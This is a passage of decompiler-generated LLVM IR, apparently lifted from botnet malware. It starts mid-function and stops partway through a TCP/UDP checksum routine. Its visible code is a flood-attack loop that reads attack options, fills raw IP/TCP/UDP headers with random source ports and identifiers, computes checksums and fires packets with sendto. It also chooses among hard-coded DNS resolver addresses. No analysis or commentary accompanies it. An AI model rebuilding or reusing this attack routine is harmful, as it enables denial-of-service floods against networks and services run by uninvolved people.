  %v3_c66c = add i32 %v2_c66c, %v0_c674
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v1_c670 = add nsw i32 %v0_c670, 1
  store i32 %v1_c670, i32* %r2.global-to-local, align 4
  %v1_c674 = add i32 %v0_c674, 1
  store i32 %v1_c674, i32* %r1.global-to-local, align 4
  %v2_c678 = trunc i32 %v0_c670 to i8
  %v3_c678 = load i32, i32* %r0.global-to-local, align 4
  %v4_c678 = inttoptr i32 %v3_c678 to i8*
  store i8 %v2_c678, i8* %v4_c678, align 1
  %v0_c67c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c67c.pre, label %bb120, label %bb118.bb119_crit_edge

bb118.bb119_crit_edge:                            ; preds = %bb118
  %v1_c67c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb119

bb119:                                            ; preds = %bb118.bb119_crit_edge, %.thread60
  %v1_c67c = phi i32 [ %v1_c67c.pre, %bb118.bb119_crit_edge ], [ %v1_c67014, %.thread60 ]
  %v2_c67c = urem i32 %v1_c67c, 256
  br label %.thread18

bb120:                                            ; preds = %bb118
  %v1_c680 = load i32, i32* %r3.global-to-local, align 4
  %v2_c680 = add i32 %v1_c680, 1
  store i32 %v2_c680, i32* %r0.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb119, %bb120
  %storemerge = phi i32 [ %v2_c67c, %bb119 ], [ 0, %bb120 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_c688 = load i32, i32* %r1.global-to-local, align 4
  %v1_c688 = load i32, i32* @r6, align 4
  %v9_c688 = icmp eq i32 %v0_c688, %v1_c688
  store i1 %v9_c688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c688, label %dec_label_pc_c690.loopexit, label %dec_label_pc_c664

dec_label_pc_c690.loopexit:                       ; preds = %.thread18
  %v2_c690.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t131 = trunc i32 %storemerge to i8
  br label %dec_label_pc_c690

dec_label_pc_c690:                                ; preds = %bb117, %dec_label_pc_c690.loopexit
  %v0_c690.off0 = phi i8 [ %extract.t131, %dec_label_pc_c690.loopexit ], [ 0, %bb117 ]
  %v2_c690 = phi i32 [ %v2_c690.pre, %dec_label_pc_c690.loopexit ], [ %v5_c64c, %bb117 ]
  %v3_c690 = inttoptr i32 %v2_c690 to i8*
  store i8 %v0_c690.off0, i8* %v3_c690, align 1
  %v3_c694 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c694, i32* %r3.global-to-local, align 4
  %v1_c698 = add i32 %v3_c694, 1
  store i32 %v1_c698, i32* @r5, align 4
  %v0_c69c = load i32, i32* @r4, align 4
  %v1_c69c = load i32, i32* @r6, align 4
  %v2_c69c = add i32 %v1_c69c, %v0_c69c
  store i32 %v2_c69c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_c6a4 = load i32, i32* @r8, align 4
  %v9_c6a4 = icmp eq i32 %v0_c6a4, %v1_c698
  store i1 %v9_c6a4, i1* %cpsr_z.global-to-local, align 1
  %v3_c6a8 = add i32 %v2_c69c, 4
  %v4_c6a8 = inttoptr i32 %v3_c6a8 to i16*
  store i16 256, i16* %v4_c6a8, align 2
  %v0_c6ac = load i32, i32* @lr, align 4
  %v1_c6ac = trunc i32 %v0_c6ac to i16
  %v2_c6ac = load i32, i32* %r2.global-to-local, align 4
  %v3_c6ac = add i32 %v2_c6ac, 2
  %v4_c6ac = inttoptr i32 %v3_c6ac to i16*
  store i16 %v1_c6ac, i16* %v4_c6ac, align 2
  %v0_c6b0 = load i32, i32* @r5, align 4
  store i32 %v0_c6b0, i32* %stack_var_-44, align 4
  %v8_c6b4 = icmp sgt i32 %v0_c6a4, %v1_c698
  br i1 %v8_c6b4, label %dec_label_pc_c570, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c690
  store i32 %v4_c5dc, i32* %r0.global-to-local, align 4
  %v0_c6bc = load i32, i32* @r6, align 4
  %v2_c6bc = add i32 %v0_c6bc, %v4_c5dc
  store i32 %v2_c6bc, i32* @r7, align 4
  %v0_c6c4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_c6c0.preheader

dec_label_pc_c6c0.preheader:                      ; preds = %.dec_label_pc_c6c0.preheader_crit_edge, %dec_label_pc_c6b8
  %v4_c724.pre-phi = phi i32 [ %.pre, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v4_c5dc, %dec_label_pc_c6b8 ]
  %v0_c6c4.pre = phi i32 [ 0, %.dec_label_pc_c6c0.preheader_crit_edge ], [ %v0_c6c4.pre.pre, %dec_label_pc_c6b8 ]
  %v3_c6f0 = icmp eq i32 %v3_c494, 65535
  %v3_c700 = icmp eq i32 %v3_c49c, 65535
  br label %dec_label_pc_c6c0

dec_label_pc_c6c0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8, %dec_label_pc_c6c0.preheader
  %v0_c6c4 = phi i32 [ %v0_c6c4.pre, %dec_label_pc_c6c0.preheader ], [ 0, %dec_label_pc_c7b8 ], [ 0, %dec_label_pc_c6c0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c6c4 = icmp eq i32 %v0_c6c4, 0
  store i1 %v2_c6c4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c6c4, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c6c0, %dec_label_pc_c7b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_c6d4 = load i32, i32* @r7, align 4
  %v1_c6d4 = add i32 %v0_c6d4, 27
  store i32 %v1_c6d4, i32* @sb, align 4
  %v1_c6d8 = add i32 %v0_c6d4, 47
  store i32 %v1_c6d8, i32* @sl, align 4
  br label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c720, %dec_label_pc_c6d0
  %v1_c6e8 = phi i32 [ %v1_c7a8, %dec_label_pc_c720 ], [ 0, %dec_label_pc_c6d0 ]
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  store i32 %v3_c494, i32* %ip.global-to-local, align 4
  %v4_c6e8 = mul i32 %v1_c6e8, 4
  %v5_c6e8 = add i32 %v4_c6e8, %v2_c1ec
  %v6_c6e8 = inttoptr i32 %v5_c6e8 to i32*
  %v7_c6e8 = load i32, i32* %v6_c6e8, align 4
  store i32 %v7_c6e8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_c6f0, i1* %cpsr_z.global-to-local, align 1
  %v1_c6f4 = add i32 %v7_c6e8, 20
  store i32 %v1_c6f4, i32* @r6, align 4
  br i1 %v3_c6f0, label %dec_label_pc_c7cc, label %dec_label_pc_c6fc

dec_label_pc_c6fc:                                ; preds = %dec_label_pc_c6dc
  store i32 %v3_c49c, i32* @lr, align 4
  store i1 %v3_c700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c700, label %dec_label_pc_c7e0, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge, %dec_label_pc_c6fc
  %v1_c70c = phi i32 [ %v1_c70c.pre, %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge ], [ 65535, %dec_label_pc_c6fc ]
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v9_c70c = icmp eq i32 %v3_c4b8, %v1_c70c
  store i1 %v9_c70c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c70c, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v1_c718 = phi i32 [ %v1_c7ec, %dec_label_pc_c7e0 ], [ %v1_c70c, %dec_label_pc_c708 ]
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v9_c718 = icmp eq i32 %v3_c4c0, %v1_c718
  store i1 %v9_c718, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c718, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714, %dec_label_pc_c808
  %v0_c720 = load i32, i32* @r4, align 4
  %v1_c720 = add i32 %v0_c720, 41
  store i32 %v1_c720, i32* %r0.global-to-local, align 4
  store i32 %v4_c724.pre-phi, i32* %r1.global-to-local, align 4
  %v2_c728 = call i32 @rand_alpha_str(i32 %v1_c720, i32 %v4_c724.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c730 = load i32, i32* @r4, align 4
  %v3_c730 = add i32 %v2_c730, 10
  %v4_c730 = inttoptr i32 %v3_c730 to i16*
  store i16 0, i16* %v4_c730, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c738 = load i32, i32* @r4, align 4
  store i32 %v0_c738, i32* @r0, align 4
  %v2_c73c = call i32 @checksum_generic(i32 %v0_c738, i32 20)
  %v3_c73c = trunc i32 %v2_c73c to i16
  store i32 %v2_c73c, i32* %r0.global-to-local, align 4
  %v3_c740 = load i32, i32* @r4, align 4
  %v4_c740 = add i32 %v3_c740, 10
  %v5_c740 = inttoptr i32 %v4_c740 to i16*
  store i16 %v3_c73c, i16* %v5_c740, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_c748 = load i32, i32* @r6, align 4
  %v3_c748 = add i32 %v2_c748, 6
  %v4_c748 = inttoptr i32 %v3_c748 to i16*
  store i16 0, i16* %v4_c748, align 2
  %v0_c74c = load i32, i32* @r6, align 4
  store i32 %v0_c74c, i32* @r1, align 4
  %v1_c750 = add i32 %v0_c74c, 4
  %v2_c750 = inttoptr i32 %v1_c750 to i16*
  %v3_c750 = load i16, i16* %v2_c750, align 2
  %v4_c750 = zext i16 %v3_c750 to i32
  store i32 %v4_c750, i32* %r2.global-to-local, align 4
  %v0_c754 = load i32, i32* @sb, align 4
  store i32 %v0_c754, i32* %r3.global-to-local, align 4
  %v0_c758 = load i32, i32* @r4, align 4
  store i32 %v0_c758, i32* %r0.global-to-local, align 4
  %v4_c75c = call i32 @checksum_tcpudp(i32 %v0_c758, i32 %v0_c74c, i32 %v4_c750, i32 %v0_c754)
  %v5_c75c = trunc i32 %v4_c75c to i16
  store i32 %v4_c75c, i32* %r0.global-to-local, align 4
  %v3_c760 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c760, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_c768 = mul i32 %v3_c760, 32
  store i32 %v3_c768, i32* %ip.global-to-local, align 4
  %v3_c76c = load i32, i32* @r6, align 4
  %v4_c76c = add i32 %v3_c76c, 6
  %v5_c76c = inttoptr i32 %v4_c76c to i16*
  store i16 %v5_c75c, i16* %v5_c76c, align 2
  %v0_c770 = load i32, i32* %ip.global-to-local, align 4
  %v1_c770 = load i32, i32* %r3.global-to-local, align 4
  %tmp133 = mul i32 %v1_c770, -8
  %v5_c770 = add i32 %v0_c770, %tmp133
  store i32 %v5_c770, i32* %ip.global-to-local, align 4
  %v0_c774 = load i32, i32* @r6, align 4
  %v1_c774 = add i32 %v0_c774, 2
  %v2_c774 = inttoptr i32 %v1_c774 to i16*
  %v3_c774 = load i16, i16* %v2_c774, align 2
  %v4_c774 = zext i16 %v3_c774 to i32
  store i32 %v4_c774, i32* @r6, align 4
  %v1_c778 = load i32, i32* @lr, align 4
  %v2_c778 = add i32 %v1_c778, %v5_c770
  store i32 %v2_c778, i32* %ip.global-to-local, align 4
  %v3_c77c = add i32 %v2_c778, 2
  %v4_c77c = inttoptr i32 %v3_c77c to i16*
  store i16 %v3_c774, i16* %v4_c77c, align 2
  %v0_c780 = load i32, i32* @fp, align 4
  %v1_c780 = load i32, i32* %ip.global-to-local, align 4
  %v2_c780 = add i32 %v1_c780, 4
  %v3_c780 = inttoptr i32 %v2_c780 to i32*
  store i32 %v0_c780, i32* %v3_c780, align 4
  %v0_c784 = load i32, i32* @r4, align 4
  store i32 %v0_c784, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v0_c790 = load i32, i32* @sl, align 4
  store i32 %v0_c790, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_c798 = load i32, i32* %ip.global-to-local, align 4
  %v6_c7a0 = call i32 @__libc_sendto(i32 %v3_c438, i32 %v0_c784, i32 %v0_c790, i32 16384, i32 %v0_c798, i32 16)
  %v3_c7a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a4, i32* %r3.global-to-local, align 4
  %v1_c7a8 = add i32 %v3_c7a4, 1
  store i32 %v1_c7a8, i32* %r0.global-to-local, align 4
  %v0_c7ac = load i32, i32* @r8, align 4
  %v9_c7ac = icmp eq i32 %v0_c7ac, %v1_c7a8
  store i1 %v9_c7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7a8, i32* %stack_var_-44, align 4
  %v8_c7b4 = icmp sgt i32 %v0_c7ac, %v1_c7a8
  br i1 %v8_c7b4, label %dec_label_pc_c6dc, label %dec_label_pc_c7b8

dec_label_pc_c7b8:                                ; preds = %dec_label_pc_c720
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7bc = icmp eq i32 %v0_c7ac, 0
  store i1 %v2_c7bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7bc, label %dec_label_pc_c6c0, label %dec_label_pc_c6d0

dec_label_pc_c7cc:                                ; preds = %dec_label_pc_c6dc
  %v0_c7cc = call i32 @rand_next()
  %v1_c7cc = trunc i32 %v0_c7cc to i16
  store i32 %v0_c7cc, i32* %r0.global-to-local, align 4
  store i32 %v3_c49c, i32* @lr, align 4
  %v1_c7d4 = load i32, i32* @r5, align 4
  %v9_c7d4 = icmp eq i32 %v3_c49c, %v1_c7d4
  store i1 %v9_c7d4, i1* %cpsr_z.global-to-local, align 1
  %v3_c7d8 = load i32, i32* @r4, align 4
  %v4_c7d8 = add i32 %v3_c7d8, 4
  %v5_c7d8 = inttoptr i32 %v4_c7d8 to i16*
  store i16 %v1_c7cc, i16* %v5_c7d8, align 2
  br i1 %v9_c7d4, label %dec_label_pc_c7e0, label %dec_label_pc_c7cc.dec_label_pc_c708_crit_edge

dec_label_pc_c7cc.dec_label_pc_c708_crit_edge:    ; preds = %dec_label_pc_c7cc
  %v1_c70c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c708

dec_label_pc_c7e0:                                ; preds = %dec_label_pc_c7cc, %dec_label_pc_c6fc
  %v0_c7e0 = call i32 @rand_next()
  %v1_c7e0 = trunc i32 %v0_c7e0 to i16
  %v3_c7e4 = load i32, i32* @r4, align 4
  %v4_c7e4 = add i32 %v3_c7e4, 20
  %v5_c7e4 = inttoptr i32 %v4_c7e4 to i16*
  store i16 %v1_c7e0, i16* %v5_c7e4, align 2
  store i32 %v3_c4b8, i32* %r0.global-to-local, align 4
  %v1_c7ec = load i32, i32* @r5, align 4
  %v9_c7ec = icmp eq i32 %v3_c4b8, %v1_c7ec
  store i1 %v9_c7ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c7ec, label %dec_label_pc_c7f4, label %dec_label_pc_c714

dec_label_pc_c7f4:                                ; preds = %dec_label_pc_c7e0, %dec_label_pc_c708
  %v0_c7f4 = call i32 @rand_next()
  %v1_c7f4 = trunc i32 %v0_c7f4 to i16
  store i32 %v0_c7f4, i32* %r0.global-to-local, align 4
  store i32 %v3_c4c0, i32* %r2.global-to-local, align 4
  %v1_c7fc = load i32, i32* @r5, align 4
  %v9_c7fc = icmp eq i32 %v3_c4c0, %v1_c7fc
  store i1 %v9_c7fc, i1* %cpsr_z.global-to-local, align 1
  %v3_c800 = load i32, i32* @r6, align 4
  %v4_c800 = add i32 %v3_c800, 2
  %v5_c800 = inttoptr i32 %v4_c800 to i16*
  store i16 %v1_c7f4, i16* %v5_c800, align 2
  br i1 %v9_c7fc, label %dec_label_pc_c808, label %dec_label_pc_c720

dec_label_pc_c808:                                ; preds = %dec_label_pc_c7f4, %dec_label_pc_c714
  %v0_c808 = call i32 @rand_next()
  %v1_c808 = trunc i32 %v0_c808 to i16
  store i32 %v0_c808, i32* %r0.global-to-local, align 4
  %v3_c80c = load i32, i32* @r4, align 4
  %v4_c80c = add i32 %v3_c80c, 28
  %v5_c80c = inttoptr i32 %v4_c80c to i16*
  store i16 %v1_c808, i16* %v5_c80c, align 2
  br label %dec_label_pc_c720

dec_label_pc_c814:                                ; preds = %dec_label_pc_c39c, %dec_label_pc_c37c, %dec_label_pc_c320, %entry
  %v0_c814 = call i32 @rand_next()
  %v1_c818 = urem i32 %v0_c814, 4
  store i32 %v1_c818, i32* %r0.global-to-local, align 4
  %v2_c81c = icmp eq i32 %v1_c818, 3
  store i1 %v2_c81c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_c814 to i2
  switch i2 %trunc, label %dec_label_pc_c4189 [
    i2 0, label %dec_label_pc_c874
    i2 1, label %dec_label_pc_c86c
    i2 -2, label %dec_label_pc_c860
    i2 -1, label %dec_label_pc_c850
  ]

dec_label_pc_c838:                                ; preds = %dec_label_pc_c448
  store i32 %v3_c438, i32* %r0.global-to-local, align 4
  %v1_c83c = call i32 @__GI___libc_close(i32 %v3_c438)
  store i32 %v1_c83c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c840

dec_label_pc_c840:                                ; preds = %dec_label_pc_c420, %dec_label_pc_c418, %dec_label_pc_c838
  %v1_c84c = phi i32 [ %v3_c438, %dec_label_pc_c420 ], [ %v1_c84c50, %dec_label_pc_c418 ], [ %v1_c83c, %dec_label_pc_c838 ]
  store i32 %v18_c1cc, i32* %sb.global-to-local, align 4
  store i32 %v27_c1cc, i32* %lr.global-to-local, align 4
  ret i32 %v1_c84c

dec_label_pc_c850:                                ; preds = %dec_label_pc_c814
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c860:                                ; preds = %dec_label_pc_c814
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c86c:                                ; preds = %dec_label_pc_c814
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_c418

dec_label_pc_c874:                                ; preds = %dec_label_pc_c814
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_c418

; uselistorder directives
  uselistorder i32 %v1_c818, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_c814, { 1, 0 }
  uselistorder i32 %v0_c808, { 1, 0 }
  uselistorder i32 %v0_c7f4, { 1, 0 }
  uselistorder i32 %v1_c7ec, { 1, 0 }
  uselistorder i32 %v0_c7cc, { 1, 0 }
  uselistorder i32 %v1_c7a8, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c770, { 1, 0 }
  uselistorder i32 %v4_c75c, { 1, 0 }
  uselistorder i32 %v2_c73c, { 1, 0 }
  uselistorder i1 %v3_c700, { 1, 0 }
  uselistorder i1 %v3_c6f0, { 1, 0 }
  uselistorder i32 %v4_c724.pre-phi, { 1, 0 }
  uselistorder i32 %v1_c698, { 1, 0, 2 }
  uselistorder i32 %v0_c688, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_c674, { 2, 0, 3, 1 }
  uselistorder i32 %v0_c670, { 1, 0, 2 }
  uselistorder i32 %v0_c5e0, { 1, 0 }
  uselistorder i32 %v4_c5dc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp112, { 1, 0 }
  uselistorder i32 %v3_c528, { 1, 0 }
  uselistorder i32 %v3_c4e4, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v3_c4a4, { 1, 0 }
  uselistorder i32 %v3_c49c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_c494, { 0, 2, 1 }
  uselistorder i8 %v5_c48c, { 1, 0, 2 }
  uselistorder i32 %v1_c478, { 1, 0 }
  uselistorder i32 %v0_c478, { 1, 0 }
  uselistorder i1 %v7_c468, { 1, 0 }
  uselistorder i1 %v7_c43c, { 1, 0 }
  uselistorder i32 %v3_c438, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_c418, { 1, 0, 2 }
  uselistorder i32 %v2_c3e8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_c3e4, { 1, 0, 2 }
  uselistorder i1 %v7_c3d0, { 1, 0 }
  uselistorder i32 %v1_c3cc, { 1, 0, 2 }
  uselistorder i1 %v8_c3c4, { 1, 0 }
  uselistorder i1 %v7_c3c0, { 1, 0 }
  uselistorder i32 %v1_c3b4, { 1, 0 }
  uselistorder i8 %v2_c3a8, { 2, 0, 1, 3 }
  uselistorder i32 %v0_c3ac, { 1, 0 }
  uselistorder i32 %v0_c3cc, { 3, 0, 2, 1 }
  uselistorder i32 %v0_c39c, { 0, 2, 1 }
  uselistorder i32 %v1_c3b0, { 0, 2, 1 }
  uselistorder i32 %v2_c384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c37c, { 1, 0, 2, 3 }
  uselistorder i1 %v7_c374, { 1, 0 }
  uselistorder i32 %v0_c374, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v0_c318, { 1, 0, 3, 2 }
  uselistorder i32 %v6_c2b8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c29c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_c284, { 2, 1, 0, 3 }
  uselistorder i32 %v1_c26c, { 1, 2, 0 }
  uselistorder i32 %v5_c260, { 0, 2, 1 }
  uselistorder i32 %v7_c228, { 1, 0, 2, 3 }
  uselistorder i32 %v5_c228, { 0, 2, 1 }
  uselistorder i32 %v2_c1ec, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 36, 35, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 6, 5, 8, 7, 9, 11, 10, 12, 13, 14, 16, 15, 19, 17, 18, 20, 21, 26, 22, 23, 24, 25, 30, 27, 28, 29, 31, 33, 32, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 46, 45, 48, 47, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i16 64, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 41, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @attack_get_opt_int, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 87, 88, 89, 90, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c840, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c720, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
  uselistorder label %dec_label_pc_c6c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c6c0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_c690, { 1, 0 }
  uselistorder label %.thread18, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %dec_label_pc_c3e0, { 1, 0 }
  uselistorder label %dec_label_pc_c3d0, { 1, 0 }
  uselistorder label %dec_label_pc_c39c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c394, { 1, 0 }
}

define i32 @checksum_generic(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_c8b0, label %dec_label_pc_c898

dec_label_pc_c898:                                ; preds = %entry
  %v0_c8a0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c89c

dec_label_pc_c89c:                                ; preds = %dec_label_pc_c89c, %dec_label_pc_c898
  %v0_c8a8 = phi i32 [ %v2_c8a8, %dec_label_pc_c89c ], [ 0, %dec_label_pc_c898 ]
  %v0_c8a0 = phi i32 [ %v5_c8a0, %dec_label_pc_c89c ], [ %v0_c8a0.pre, %dec_label_pc_c898 ]
  %v0_c89c = phi i32 [ %v1_c89c, %dec_label_pc_c89c ], [ %arg1, %dec_label_pc_c898 ]
  %v1_c89c = add i32 %v0_c89c, -2
  %v1_c8a0 = inttoptr i32 %v0_c8a0 to i16*
  %v2_c8a0 = load i16, i16* %v1_c8a0, align 2
  %v3_c8a0 = zext i16 %v2_c8a0 to i32
  %v5_c8a0 = add i32 %v0_c8a0, -2
  store i32 %v5_c8a0, i32* @r0, align 4
  %v2_c8a8 = add i32 %v3_c8a0, %v0_c8a8
  %v1_c89c.cmp = icmp ugt i32 %v1_c89c, 1
  br i1 %v1_c89c.cmp, label %dec_label_pc_c89c, label %dec_label_pc_c8b0.loopexit

dec_label_pc_c8b0.loopexit:                       ; preds = %dec_label_pc_c89c
  br label %dec_label_pc_c8b0

dec_label_pc_c8b0:                                ; preds = %entry, %dec_label_pc_c8b0.loopexit
  %v1_c8b8 = phi i32 [ %v2_c8a8, %dec_label_pc_c8b0.loopexit ], [ 0, %entry ]
  %v0_c8b0 = phi i32 [ %v1_c89c, %dec_label_pc_c8b0.loopexit ], [ %arg1, %entry ]
  %v7_c8b0 = icmp eq i32 %v0_c8b0, 1
  br i1 %v7_c8b0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_c8b0
  %v1_c8b4 = load i32, i32* @r0, align 4
  %v2_c8b4 = inttoptr i32 %v1_c8b4 to i8*
  %v3_c8b4 = load i8, i8* %v2_c8b4, align 1
  %v4_c8b4 = zext i8 %v3_c8b4 to i32
  %v3_c8b8 = add i32 %v1_c8b8, %v4_c8b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_c8b0, %bb
  %v0_c8bc = phi i32 [ %v1_c8b8, %dec_label_pc_c8b0 ], [ %v3_c8b8, %bb ]
  %v3_c8c0 = urem i32 %v0_c8bc, 65536
  %v4_c8c4 = udiv i32 %v0_c8bc, 65536
  %v5_c8c4 = add nuw nsw i32 %v4_c8c4, %v3_c8c0
  %v4_c8c8 = udiv i32 %v5_c8c4, 65536
  %v5_c8c8 = add nuw nsw i32 %v4_c8c8, %v5_c8c4
  %v1_c8cc = urem i32 %v5_c8c8, 65536
  %v3_c8d4 = xor i32 %v1_c8cc, 65535
  ret i32 %v3_c8d4

; uselistorder directives
  uselistorder i32 %v5_c8c4, { 1, 0 }
  uselistorder i32 %v5_c8a0, { 1, 0 }
  uselistorder i32 %v1_c89c, { 1, 0, 2 }
  uselistorder i32 %v0_c8a0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_c8b0, { 1, 0 }
}

define i32 @checksum_tcpudp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_c8ec = add i32 %arg1, 12
  %v2_c8ec = inttoptr i32 %v1_c8ec to i32*
  %v3_c8ec = load i32, i32* %v2_c8ec, align 4
  %v1_c8f0 = add i32 %arg1, 16
  %v2_c8f0 = inttoptr i32 %v1_c8f0 to i32*
  %v3_c8f0 = load i32, i32* %v2_c8f0, align 4
  %v7_c8f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_c8f4, label %dec_label_pc_c900.preheader, label %dec_label_pc_c914

dec_label_pc_c900.preheader:                      ; preds = %entry
  %v0_c904.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c900

dec_label_pc_c900:                                ; preds = %dec_label_pc_c900.preheader, %dec_label_pc_c900
  %v0_c90c = phi i32 [ 0, %dec_label_pc_c900.preheader ], [ %v2_c90c, %dec_label_pc_c900 ]
